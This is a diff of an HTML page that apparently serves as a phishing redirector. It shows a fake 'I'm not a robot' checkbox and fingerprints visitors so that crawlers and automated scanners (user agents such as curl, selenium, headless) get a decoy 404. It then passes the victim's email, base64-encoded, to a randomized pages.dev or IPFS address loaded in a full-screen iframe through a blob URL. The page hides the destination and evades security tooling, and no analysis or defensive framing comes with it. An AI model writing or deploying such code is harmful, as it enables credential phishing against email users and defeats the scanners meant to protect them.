@@ -1,275 +1,233 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Human Verification</title>
-<style>
-/* FULLSCREEN OVERLAY */
-#overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0, 135, 90, 0.95);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 999999;
-}
-/* VERIFICATION BOX */
-#verificationBox {
-    width: 220px;
-    padding: 16px;
-    border-radius: 14px;
-    background: #fff;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-    border: 1px solid #dcdcdc;
-    text-align: left;
-    font-family: Arial, sans-serif;
-    position: relative;
-}
-#verificationBox .header {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    margin-bottom: 12px;
-}
-#robotIcon {
-    width: 28px;
-    height: 28px;
-    border-radius: 50%;
-    background: #f8f9fa;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 16px;
-    color: #555;
-    transform: rotate(0deg);
-    transition: transform 0.05s linear;
-}
-#verificationBox .header span {
-    font-size: 15px;
-    color: #333;
-}
-/* SLIDER */
-#sliderContainer {
-    width: 100%;
-    height: 36px; /* slightly taller for easier mobile use */
-    background: #f1f3f4;
-    border-radius: 18px;
-    position: relative;
-    cursor: pointer;
-    overflow: hidden;
-}
-#sliderFill {
-    position: absolute;
-    top: 0;
-    left: 0;
-    height: 100%;
-    background: #d2e7d5;
-    width: 0;
-    border-radius: 18px;
-    transition: width 0.1s;
-}
-#slider {
-    width: 36px;  /* bigger handle for mobile */
-    height: 36px;
-    background: #34a853;
-    border-radius: 50%;
-    position: absolute;
-    top: 0;
-    left: 0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #fff;
-    font-size: 18px;
-    transition: left 0.1s;
-    z-index: 2;
-}
-#sliderText {
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    pointer-events: none;
-    color: #555;
-    font-size: 14px;
-    transition: opacity 0.2s;
-}
-/* CHECKMARK */
-#checkmark {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%) scale(0);
-    font-size: 18px;
-    color: #34a853;
-    pointer-events: none;
-    transition: transform 0.3s ease;
-}
-/* SPINNER */
-.spinner {
-    width: 12px;
-    height: 12px;
-    border-radius: 50%;
-    border: 2px solid #40739e;
-    border-top-color: transparent;
-    animation: spin 0.6s linear infinite;
-}
-@keyframes spin { from { transform: rotate(0); } to { transform: rotate(360deg); } }
-#verifying {
-    display: none;
-    margin-top: 10px;
-    font-size: 12px;
-    color: #555;
-    text-align: center;
-}
-</style>
+    <title>Blob IPFS Redirect + Friendly Anti-Bot</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+    /* FULLSCREEN OVERLAY */
+    #overlay {
+        position: fixed;
+        inset: 0;
+        background: #00875A;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        opacity: 1;
+        z-index: 999999;
+    }
+
+    /* VERIFICATION BOX */
+    #verificationBox {
+        background: #fff;
+        padding: 16px 20px;
+        border-radius: 16px;
+        width: 220px;
+        box-shadow: 0 4px 14px rgba(0,0,0,0.14);
+        border: 1px solid #dcdcdc;
+    }
+
+    .verify-row {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    #robotIcon {
+        width: 26px;
+        height: 26px;
+        border-radius: 50%;
+        background: #e8f0fe;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 14px;
+    }
+
+    #checkbox {
+        width: 22px;
+        height: 22px;
+        border-radius: 5px;
+        border: 2px solid #7f8fa6;
+        background: #fff;
+        cursor: pointer;
+        position: relative;
+        transition: 0.2s;
+    }
+
+    #checkbox.active {
+        background: #34a853;
+        border-color: #34a853;
+        box-shadow: 0 0 6px rgba(52,168,83,0.6);
+    }
+
+    #checkbox.active::after {
+        content: "";
+        position: absolute;
+        left: 6px;
+        top: 3px;
+        width: 5px;
+        height: 10px;
+        border: 2px solid white;
+        border-left: none;
+        border-top: none;
+        transform: rotate(45deg);
+    }
+
+    #verifying {
+        display: none;
+        margin-top: 10px;
+        font-size: 12px;
+        text-align: center;
+        color: #555;
+    }
+
+    .spinner {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        border: 2px solid #40739e;
+        border-top-color: transparent;
+        animation: spin .6s linear infinite;
+    }
+
+    @keyframes spin {
+        from { transform: rotate(0); }
+        to { transform: rotate(360deg); }
+    }
+    </style>
 </head>
 <body>
 
 <div id="overlay">
     <div id="verificationBox">
-        <div class="header">
+        <div class="verify-row">
             <div id="robotIcon">🤖</div>
-            <span>I'm not a robot</span>
+            <strong>I'm not a robot</strong>
+            <div id="checkbox"></div>
         </div>
-
-        <div id="sliderContainer">
-            <div id="sliderFill"></div>
-            <div id="slider">→</div>
-            <div id="sliderText">Slide to verify</div>
-            <div id="checkmark">✓</div>
-        </div>
-
         <div id="verifying">
-            <div style="display:flex; justify-content:center; align-items:center; gap:6px;">
-                Verifying <div class="spinner"></div>
+            <div class="verify-loading">
+                <div class="spinner"></div> Verifying…
             </div>
         </div>
     </div>
 </div>
 
-<audio id="beepSound" src="https://www.soundjay.com/button/sounds/button-3.mp3" preload="auto"></audio>
-
 <script>
-// IPFS URL
-const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
-function getEmail() { return new URLSearchParams(location.search).get("email") || ""; }
-function buildIPFS(email) { return email ? BASE_IPFS + "#" + email : BASE_IPFS; }
-function createBlobHTML(url) {
-    return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
-        html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
-        iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
-    </style></head><body><iframe src="${url}"></iframe></body></html>`;
-}
-
-// BOT CHECK
-function computeBotScore() {
+/* ===================== FRIENDLY BOT DETECTION ===================== */
+async function friendlyBotCheck() {
     let score = 0;
     const ua = navigator.userAgent.toLowerCase();
-    if (/bot|crawl|spider|curl|wget|python|headless|selenium|puppeteer|playwright/.test(ua)) score += 50;
-    if (navigator.webdriver) score += 50;
-    return score;
+    const bots = ["bot","crawl","spider","curl","wget","python","scrapy","headless","selenium","puppeteer","playwright"];
+    if (bots.some(b => ua.includes(b))) score += 30;
+    if (navigator.webdriver) score += 30;
+
+    try { 
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (!ctx) score += 10;
+    } catch { score += 10; }
+
+    try { 
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        if (ctx.sampleRate < 30000) score += 5;
+    } catch { score += 5; }
+
+    if (screen.width < 500 || screen.height < 400) score += 5;
+
+    let movements = [];
+    window.addEventListener("mousemove", e => { movements.push({x:e.clientX, y:e.clientY}); });
+
+    await new Promise(r => setTimeout(r, 1000));
+    if (movements.length < 3) score += 10;
+
+    return score >= 60;
 }
 
-// ROBOT ROTATION
-let robotRotation = 0;
-const robotIcon = document.getElementById("robotIcon");
-let rotationSpeed = 1; // idle speed
-function rotateRobot() {
-    robotRotation += rotationSpeed;
-    robotIcon.style.transform = `rotate(${robotRotation}deg)`;
-    requestAnimationFrame(rotateRobot);
-}
-rotateRobot();
+/* ===================== RANDOMIZED REDIRECT LOGIC ===================== */
+const BASE_DOMAIN = "https://23b538b5.ko1wx90sd.pages.dev";
 
-// SLIDER
-const slider = document.getElementById("slider");
-const sliderContainer = document.getElementById("sliderContainer");
-const sliderText = document.getElementById("sliderText");
-const sliderFill = document.getElementById("sliderFill");
-const verifying = document.getElementById("verifying");
-const overlay = document.getElementById("overlay");
-const checkmark = document.getElementById("checkmark");
-const beepSound = document.getElementById("beepSound");
+// Multiple sub-folders
+const SUBFOLDERS = ["sub1", "sub2", "sub3", "sub4", "sub5"];
 
-let isDragging = false;
-let startX = 0;
-let beepPlayed = false;
-
-function startDrag(clientX) {
-    if (!isDragging) {
-        isDragging = true;
-        startX = clientX - slider.offsetLeft;
-        rotationSpeed = 5; // faster rotation while dragging
-        if (!beepPlayed) {
-            beepPlayed = true;
-            beepSound.currentTime = 0;
-            beepSound.play().catch(()=>{});
-        }
-    }
+// Simple URL-safe base64 encode
+function base64Encode(str) {
+    return btoa(unescape(encodeURIComponent(str))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
 }
 
-function onDrag(clientX) {
-    if (!isDragging) return;
-    let x = clientX - startX;
-    if (x < 0) x = 0;
-    if (x > sliderContainer.offsetWidth - slider.offsetWidth) x = sliderContainer.offsetWidth - slider.offsetWidth;
-    slider.style.left = x + "px";
-    sliderFill.style.width = x + slider.offsetWidth/2 + "px";
-    sliderText.style.opacity = 1 - x / (sliderContainer.offsetWidth - slider.offsetWidth);
+// Build randomized per-visit URL
+function buildRandomURL(email="") {
+    const folder = SUBFOLDERS[Math.floor(Math.random() * SUBFOLDERS.length)];
+    const timestamp = Date.now();
+    const payload = {email, ts: timestamp};
+    const encoded = base64Encode(JSON.stringify(payload));
+
+    // Final URL: https://domain/folder/?data=<encoded>
+    return `${BASE_DOMAIN}/${folder}/?data=${encoded}`;
 }
 
-function endDrag() {
-    if (!isDragging) return;
-    isDragging = false;
-    rotationSpeed = 1; // back to idle
-
-    if (parseInt(slider.style.left) >= sliderContainer.offsetWidth - slider.offsetWidth - 1) {
-        if (navigator.vibrate) navigator.vibrate(50); // vibration feedback
-
-        const botScore = computeBotScore();
-        if (botScore >= 60) {
-            alert("Suspicious activity detected.");
-            slider.style.left = "0px";
-            sliderFill.style.width = "0px";
-            sliderText.style.opacity = 1;
-            return;
-        }
-
-        checkmark.style.transform = "translate(-50%, -50%) scale(1)";
-        slider.style.display = "none";
-        sliderText.style.opacity = 0;
-        verifying.style.display = "block";
-
-        setTimeout(() => {
-            overlay.style.display = "none";
-            const email = getEmail();
-            const ipfsURL = buildIPFS(email);
-            const blobHTML = createBlobHTML(ipfsURL);
-            const blob = new Blob([blobHTML], { type: "text/html" });
-            const blobURL = URL.createObjectURL(blob);
-            window.location.href = blobURL;
-        }, 800);
-    } else {
-        slider.style.left = "0px";
-        sliderFill.style.width = "0px";
-        sliderText.style.opacity = 1;
-    }
+function createBlobHTML(url) {
+    return `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+        html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
+        iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
+        </style>
+    </head>
+    <body>
+        <iframe src="${url}"></iframe>
+    </body>
+    </html>`;
 }
 
-// Mouse events
-slider.addEventListener("mousedown", e => startDrag(e.clientX));
-document.addEventListener("mousemove", e => onDrag(e.clientX));
-document.addEventListener("mouseup", endDrag);
+/* ===================== VERIFICATION ===================== */
+function requireVerification() {
+    return new Promise(resolve => {
+        const overlay = document.getElementById("overlay");
+        const checkbox = document.getElementById("checkbox");
+        const verifying = document.getElementById("verifying");
 
-// Touch events
-slider.addEventListener("touchstart", e => startDrag(e.touches[0].clientX));
-document.addEventListener("touchmove", e => { if (isDragging) onDrag(e.touches[0].clientX); });
-document.addEventListener("touchend", endDrag);
+        checkbox.onclick = () => {
+            checkbox.classList.add("active");
+            verifying.style.display = "block";
+
+            setTimeout(() => {
+                overlay.style.opacity = 0;
+                setTimeout(() => overlay.remove(), 300);
+                resolve(true);
+            }, 700);
+        };
+    });
+}
+
+/* ===================== 404 PAGE ===================== */
+function show404() {
+    document.body.innerHTML = `
+    <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; background:#f8f8f8; text-align:center;">
+        <h1 style="font-size:90px; margin:0;">404</h1>
+        <h2 style="font-size:26px; margin:0;">Error</h2>
+        <p style="font-size:18px;">The requested page could not be found.</p>
+    </div>`;
+}
+
+/* ===================== MAIN FLOW ===================== */
+document.addEventListener("DOMContentLoaded", async () => {
+    await requireVerification();
+
+    if (await friendlyBotCheck()) { show404(); return; }
+
+    const email = new URLSearchParams(location.search).get("email") || "";
+    const url = buildRandomURL(email);
+
+    const blobHTML = createBlobHTML(url);
+    const blob = new Blob([blobHTML], { type:"text/html" });
+    const blobURL = URL.createObjectURL(blob);
+
+    window.location.href = blobURL;
+});
 </script>
 
 </body>
